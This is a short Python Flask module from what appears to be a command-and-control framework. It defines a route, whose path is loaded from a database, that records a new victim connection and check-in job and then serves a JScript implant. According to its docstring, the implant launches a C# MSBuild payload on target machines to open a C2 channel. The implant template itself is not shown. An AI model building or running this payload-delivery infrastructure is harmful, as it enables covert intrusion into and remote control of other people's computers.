from connect.server import app, db
from connect.server.database import Routes, Connections, Jobs
from flask import request, render_template


def load_route(name):
    return Routes.query.filter(Routes.name == name).one().identifier


@app.route(f"/{load_route('jscript')}", methods=['POST', 'GET'])
def jscript():
    """
    jscript Route

    The jscript route expects a get request and will return a implant to be executed on the target(s) machine. The
    implant will attempt to launch a CSharp MSBuild payload to establish a command and control connection to the
    framework.
    """
    connection = Connections()
    db.session.add(connection)
    db.session.commit()
    job = Jobs(name='check_in', connection=connection)
    db.session.add(job)
    db.session.commit()
    return render_template('/jscript/connect.js', connection_id=connection.identifier,
                           check_in_uri=f"{request.host_url}{load_route('check_in')}",
                           check_in_job_id=job.identifier)